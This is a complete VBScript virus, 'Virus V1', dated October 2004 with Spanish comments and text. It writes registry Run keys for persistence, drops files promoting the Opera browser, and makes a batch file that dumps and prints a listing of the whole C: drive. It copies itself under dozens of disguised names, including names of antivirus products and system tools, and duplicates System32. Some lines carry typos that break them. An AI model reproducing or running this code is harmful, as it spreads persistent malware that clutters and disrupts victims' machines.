'***********************************************************************************
'* _______________________________________________________________________________ *
'*  Virus V1 									   *
'*  										   *
'*  Creado en octubre del 2004							   *
'*  Néstor									   *
'* _______________________________________________________________________________ *
'*										   *
'***********************************************************************************

On Error Resume Next

Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\Opera\Opera", "C:\Opera.vbs"
ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\WINDOWS\CurrentVersion\Run\MsExplorer", "C:\Windows\MsExplorer.vbs"
ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WINDOWS\CurrentVersion\Run\System", "C:\System.vbs"

Set tf = fso.CreateTextFile("c:\Opera.txt", False)
tf.WriteLine ("Opera es mejor navegador que Internet Explorer")
tf.WriteBlankLines (2)
tf.writeLine ("Si vien Internet Explorer es el navegador más conocido y usado")
tf.writeLine ("deben saver que es el mas vulnerables a ataques y con una gran catidades de errores")
tf.writeLine ("Bajate el Opera, te lo recomiendo, es muy buno")
tf.writeLine ("Despues de usrlo no quedras usar el Internet Explorer nunca más")
tf.Close

MsgBox "Se ha ejecutado el virus V1"

Set tf2 = fso.CreateTextFile("C:\LeeEsto.txt", False)
tf2.WriteLine ("Vocabulario - Virus")
tf2.WriteBlankLines (1)
tf2.WriteLine ("Es un programa o una parte de un código cargado en su ordenador sin ")
tf2.WriteLine ("avisarle y en contra de su voluntad. La mayoría de los virus se pueden ")
tf2.WriteLine ("multiplicar. Todos los virus informáticos son artificiales, creados por una ")
tf2.WriteLine ("persona. Es muy simple producir un virus que se multiplique continuamente. ")
tf2.WriteLine ("Pero, aún así, sería muy peligroso porque dentro de poco tiempo estaría ")
tf2.WriteLine ("usando toda la memoria disponible y llevaría al bloqueo del sistema. Un tipo ")
tf2.WriteLine ("de virus todavía más peligroso es uno capaz de propagarse a través de redes ")
tf2.WriteLine ("y evitando los sistemas de seguridad.")
tf2.WriteBlankLines (1)
tf2.writeLine ("Información extraida de la ayuda del Antivirus y firewall BitDefender Professional Plus v8.0")
tf2.Close

MsgBox "Este virus fue creado a partir de Virus Chavez Para Una Mejor Venezuela!"

Set tf3 = fso.CreateTextFile("c:\Dedicado A.txt", False)
tf3.WriteLine ("Este Virus Esta Dedicado A:")
tf3.WriteBlankLines (2)
tf3.write ("Todos los que me conocen")
tf3.WriteBlankLines (2)
tf3.write ("Néstor")
tf3.Close

Set tf4 = fso.CreateTextFile ("c:\Taskv1.bat", False)
tf4.WriteLine ("Echo off")
tf4.WriteLine ("Echo ***********************************************************")
tf4.WriteLine ("Echo Virus V1 ")
tf4.WriteLine ("Echo Creado en octubre del 2004")
tf4.WriteBlankLines (1)
tf4.WriteLine ("Echo Obteniendo contenido de tu disco duro")
tf4.WriteBlankLines (1)
tf4.WriteLine ("Echo Nestor")
tf4.WriteLine ("Echo ***********************************************************")
tf4.WriteLine ("cd \")
tf4.WriteLine ("Dir /s >c:\ContenidodeC.txt")
tf4.WriteLine ("Print c:\ContenidodeC.txt")
tf4.WriteLine ("copy c:\ContenidodeC.txt a:\contenido.txt")
tf4.WriteLine ("Echo on")
tf4.close

fso copyfile ("c:\ContenidodeC.txt", "c:\Windows\Contenido.txt", False)
fso copyfile ("c:\ContenidodeC.txt", "c:\Windows\data.dll", False)
fso copyfile ("c:\ContenidodeC.txt", "c:\Windows\System\data.dll", False)

ws.Run "C:\windows\Notepad"
ws.Run "C:\windows\explorer.exe"
ws.Run "C:\Windows"
ws.Run "C:\LeeEsto.txt"
Ws.Run "c:\Opera.txt"
ws.Run "Http://www.opera.com/"
ws.Run "c:\Taskv1.bat"
Msgbox "Este es el contenido de tu disco duro"
ws.Run "c:\ContenidodeC.txt"

Set File2 = fso.opentextfile(Wscript.ScriptFullName, 1)
vbscopy = File2.ReadAll
Set c = fso.GetFile(Wscript.ScriptFullName)
c.Copy "c:\Windows\system32\Opera.scr", Fals
c.Copy "C:\Windows\System32\Scandisck.dll", False
c.Copy "C:\Windows\System32\msexplorer.dll", False
c.Copy "C:\Windows\System32\Scandisk.vbs", False
c.Copy "C:\Windows\System32\CHKDSK.vbs", False
c.Copy "C:\Windows\System\Chkdsk.dll.vbs", False
c.Copy "C:\Windows\System\msexplorer.dll", False
c.Copy "C:\Windows\System\mse.dll", False
c.Copy "C:\Windows\System.vbs", False
c.Copy "C:\Windows\MsExplorer.vbs", False
c.Copy "C:\Windows\Fax.vbs", False
c.Copy "C:\Windows\Set25.tmp", False
c.Copy "C:\Windows\Español.exe", False
c.Copy "C:\Windows\Uninstall Internet Explores.vbs", False
c.Copy "C:\Windows\Windows help.vbs", False
c.Copy "C:\Windows\IE.vbs", False
c.Copy "C:\Windows\MSDOS.vbs", False
c.Copy "C:\Windows\Motorola.vbs", False
c.Copy "C:\Windows\Inf\CHKDSK.vbs", False
c.Copy "C:\Windows\Estrellas.jpg", False
c.Copy "C:\Windows\Roca.jpg", False
c.Copy "C:\Windows\Notepad.dll", False
c.Copy "C:\Windows\Cursores\Piratas.vbs", False
c.Copy "C:\Windows\Cursors\Pirates.vbs", False
c.Copy "C:\Windows\Media\Terror.mp3", False
c.Copy "C:\Windows\Drivers\MSDOS.dll", False
c.Copy "C:\Archivos de programa\Opera.vbs", False
c.Copy "C:\Archivos de programa\Archivos comunes\Internet explorer es muy malo.vbs", False
c.Copy "C:\Archivos de programa\Internet Explorer\IE.vbs", False
c.Copy "C:\Archivos de programa\MSDOS.vbs", False
c.Copy "C:\Archivos de programa\Archivos comunes\leeme.vbs", False
c.Copy "C:\Archivos de programa\Keys.dll", False
c.Copy "C:\Archivos de programa\Debug.dll", False
c.Copy "C:\Archivos de programa\Tostadero.log.vbs", False
c.Copy "C:\Archivos de programa\Reglog.old", False
c.Copy "C:\Archivos de programa\Roca.jpg", False
c.Copy "C:\Help\Opera.vbs", False
c.Copy "C:\Uruguay.vbs", False
c.Copy "C:\2 de Febrero.vbs", False
c.Copy "C:\29 de marzo.vbs", False
c.Copy "C:\18 de abril.vbs", False
c.copy "c:\25 de mayo.vbs", False
c.copy "c:\8 de octubre.vbs", False
c.copy "c:\17 de octubre.vbs", False
c.copy "c:\ de noviembre.vbs", False
c.Copy "C:\Prohibido Olvidar.vbs", False
c.Copy "C:\Abajo el IE.vbs", False
c.Copy "C:\Opera el mejor navegador.vbs", False
c.Copy "C:\NDFM.vbs", False
c.Copy "C:\Linux.vbs", False
c.Copy "C:\Microsoft Windows 98.vbs", False
c.Copy "C:\McAfee.vbs", False
c.Copy "C:\Panda.vbs", False
c.Copy "C:\AVP.vbs", False
c.Copy "C:\AVG.vbs", False
c.Copy "C:\Dr Web.vbs", False
c.Copy "C:\Norton.vbs", False
c.Copy "C:\BitDefender.vbs", False
c.Copy "C:\F-Secure.vbs", False
c.Copy "C:\Antivir.vbs", False
c.Copy "C:\Nod32.vbs", False
c.Copy "C:\Money.vbs", False
c.Copy "C:\$$$.vbs", False
c.Copy "C:\U$S.vbs", False
c.Copy "C:\Microsoft Office.vbs", False
c.Copy "C:\Rey Arturo.vbs", False
c.Copy "C:\Errores de Windows.vbs", False
c.Copy "C:\Encuesta.vbs", False
c.Copy "C:\Puedes hacerlo???.vbs", False
c.Copy "C:\Scandisk.vbs", False


fso.copyfolder "c:\Windows\System32", "C:\Windows\System64"


'***********************************************************************************
' Inicio 13/10/2004
' Fin 18/10/2004
'***********************************************************************************
